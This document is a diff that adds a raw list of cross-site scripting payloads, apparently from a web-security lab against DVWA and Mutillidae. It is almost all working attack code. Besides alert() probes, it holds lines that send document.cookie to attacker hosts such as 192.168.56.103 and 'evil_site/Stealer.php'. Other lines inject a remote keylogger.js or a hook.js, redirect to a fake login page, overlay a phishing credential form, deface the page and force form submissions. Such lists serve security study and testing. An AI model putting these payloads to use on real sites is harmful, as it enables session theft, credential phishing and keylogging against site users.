@@ -1,0 +1,58 @@
+<script>alert(document.cookie)</script>
+<img src=1 onerror=alert(document.cookie)>
+<script>window.location = "http://192.168.56.101/log.php?c=" + document.cookie;</script>
+<img src=x onerror=alert(1)>
+<script>alert(«123»)</script>
+<iframe src="" onload="alert(1)" width="700px" height="500px"></iframe>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+--><img src=x onerror=alert(1)>
+</script><img src=x onerror=alert(1)>
+a";}catch(e){};alert('canary');
+<script>alert(123)</script>
+<img src=a onerror='alert();'>
+canary><img src=a onerror='alert();'>
+canary></select><img src=a onerror='alert(123);'>
+<script>location.href = 'http://evil_site/Stealer.php?cookie='+document.cookie;</script>
+<script>document.location="http://evil-site/some.exe";</script>
+<script>window.location="http://192.168.56.103/log.php?c=" + document.cookie;</script>
+<script>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>THIS SITE WAS HACKED</h1></div>";</script>
+<script>document.write("Site is at: " + document.location.href + ".");</script>
+http://some.site/some_page.html#<script>alert(document.cookie)</script>
+>/option></select><body onload=alert("XSS")>
+><script src=https://shodin.xss.ht></script>
+#<script>alert(123);</script>
+<script src="http://192.168.56.103/lesson_4/keylogger.js">
+<a onmouseover="javascript:var n=document.createElement('script');n.type='text/javascript';n.src='http://192.168.56.103/lesson_4/keylogger.js';x=document.getElementsByTagName('head');x[0].appendChild(n);">moveonme</a>  
+<img src=1 onerror="javascript:var n=document.createElement('script');n.type='text/javascript';n.src='http://192.168.56.103/lesson_4/alert.js';x=document.getElementsByTagName('head');x[0].appendChild(n);">
+<img src=1 onerror="javascript:var script = document.createElement('script');script.src ='http://192.168.56.103/lesson_4/alert.js';document.documentElement.appendChild(script);">
+<svg/onload="javascript:var script = document.createElement('script');script.src ='http://192.168.56.103/lesson_4/alert.js';document.documentElement.appendChild(script);">
+<svg/onload="javascript:var script = document.createElement('script');script.src ='http://192.168.56.103/lesson_4/keylogger.js';document.documentElement.appendChild(script);">
+<img src=1 onerror="javascript:var script = document.createElement('script');script.src ='http://192.168.56.103/lesson_4/keylogger.js';document.documentElement.appendChild(script);">
+<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;">Please login with valid credentials:<br><form name="login" action="" method=»GET»><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>
+<script>document.location.href="http://192.168.56.103/lesson_4/fake_dvwa/192.168.56.102/dvwa/login.html"</script>
+<img src=1 onerror="javascript:window.location.replace('http://192.168.56.103/lesson_4/fake_dvwa/192.168.56.102/dvwa/login.html')">
+<iframe src="" width="100%" height="100%" frameborder = "no"/>
+document.body.onload = function () {document.forms[1].action = "http://localhost/mutillidae/index.php?page=login.php";}
+<script>document.body.onload = function () {document.forms[1].action = "http://localhost/mutillidae/index.php?page=login.php";}</script>
+<script>document.body.onload = function () {document.forms[1].action = "http://www.aif.ru";}</script>
+document.forms[1].submit()
+<script>document.body.onload = function () {document.forms[1].elements[0].value="canary";document.forms[1].submit()}</script>
+<script>document.body.onload = function () {document.forms[1].elements[0].value="busted";document.forms[1].submit()}</script>
+<form action="http://localhost/mutillidae/index.php?page=dns-lookup.php" method="post" enctype="application/x-www-form-urlencoded" onsubmit="return onSubmitOfForm(this);" id="idDNSLookupForm"><input id="idTargetHostInput" name="target_host" size="20" autofocus="autofocus" oscommandinjectionpoint="1" title="" type="hidden"><input name="dns-lookup-php-submit-button" class="button" value="Lookup DNS" type="hidden"></form>
+<script>document.body.onload = function () {document.forms[2].elements[0].value="hacked";document.forms[2].submit()}</script>
+<script src="http://192.168.56.103:3000/hook.js"></script>
+
+<form action=javascript:alert(1)><input type=submit>
+<form action=javascript:alert(1)><input type=submit>
+<isindex action=javascript:alert(1) type=submit value=click>
+<form><button formaction=javascript:alert(1)>click
+<form><input formaction=javascript:alert(1) type=submit value=click>
+<form><input formaction=javascript:alert(1) type=image value=click>
+<form><input formaction=javascript:alert(1) type=imagesrc=http://brutelogic.com.br/webgun/img/youtube1.jpg>
+<isindex formaction=javascript:alert(1) type=submit value=click>
+<object data=javascript:alert(1)> *
+<iframe srcdoc=%26lt;svg/o%26%23x6Eload%26equals;alert%26lpar;1)%26gt;>
+<svg><script xlink:href=data:,alert(1)></script>
+<svg><script xlink:href=data:,alert(1) />
+<math><brute xlink:href=javascript:alert(1)>click 
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26>
